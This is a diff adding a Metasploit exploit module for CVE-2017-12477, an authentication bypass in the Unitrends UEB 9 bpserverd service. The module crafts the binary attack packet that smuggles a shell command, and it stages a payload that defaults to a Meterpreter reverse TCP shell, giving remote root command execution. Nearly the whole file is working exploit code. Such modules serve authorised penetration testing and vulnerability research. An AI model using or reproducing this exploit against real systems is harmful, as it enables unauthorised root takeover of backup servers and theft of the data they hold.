@@ -1,0 +1,119 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Unitrends UEB bpserverd authentication bypass RCE',
+      'Description'    => %q{
+       It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd,
+       has an issue in which its authentication can be bypassed.  A remote attacker could use this
+       issue to execute arbitrary commands with root privilege on the target system.
+      },
+      'Author'         =>
+        [
+          'Jared Arave',  # @iotennui
+          'Cale Smith',   # @0xC413
+          'Benny Husted'  # @BennyHusted
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'linux',
+      'Arch' => [ARCH_X86],
+      'CmdStagerFlavor' => [ 'printf' ],
+      'References'     =>
+        [
+          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000CcZeAAK/000005755'],
+          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-12477'],
+          ['CVE', '2017-12477'],
+        ],
+      'Targets'        =>
+        [
+          [ 'UEB 9.*', { } ]
+        ],
+      'Privileged'     => true,
+      'DefaultOptions' => {
+          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
+          'SSL' => false
+        },
+      'DisclosureDate'  => 'Aug 8 2017',
+      'DefaultTarget'   => 0))
+    register_options([
+        Opt::RPORT(1743)
+      ])
+    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
+  end
+
+  def check
+    s1 = connect(global = false)
+    buf1  = s1.get_once(-1).to_s
+    #parse out the bpd port returned
+    bpd_port = buf1[-8..-3].to_i
+
+    #check if it's a valid port number (1-65534)
+    if bpd_port && bpd_port >= 1 && bpd_port <= 65535
+      Exploit::CheckCode::Detected
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def execute_command(cmd, opts = {})
+
+    #append a comment, ignore everything after our cmd
+    cmd = cmd + " #"
+
+    # build the attack buffer...
+    command_len = cmd.length + 3
+    packet_len = cmd.length + 23
+    data =  "\xa5\x52\x00\x2d"
+    data << "\x00\x00\x00"
+    data << packet_len
+    data << "\x00\x00\x00"
+    data << "\x01"
+    data << "\x00\x00\x00"
+    data << "\x4c"
+    data << "\x00\x00\x00"
+    data << command_len
+    data << cmd
+    data << "\x00\x00\x00"
+
+    begin
+      print_status("Connecting to xinetd for bpd port...")
+      s1 = connect(global = false)
+      buf1  = s1.get_once(-1).to_s
+
+      #parse out the bpd port returned, we will connect back on this port to send our cmd
+      bpd_port = buf1[-8..-3].to_i
+
+      print_good("bpd port recieved: #{bpd_port}")
+      vprint_status("Connecting to #{bpd_port}")
+
+      s2 = connect(global = false, opts = {'RPORT'=>bpd_port})
+      vprint_good('Connected!')
+
+      print_status('Sending command buffer to xinetd')
+
+      s1.put(data)
+      s2.get_once(-1,1).to_s
+
+      disconnect(s1)
+      disconnect(s2)
+
+    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+      fail_with(Failure::Unreachable, "#{peer} - Connection to server failed")
+    end
+
+  end
+
+  def exploit
+    print_status("#{peer} - pwn'ng ueb 9....")
+    execute_cmdstager(:linemax => 200)
+  end
+end
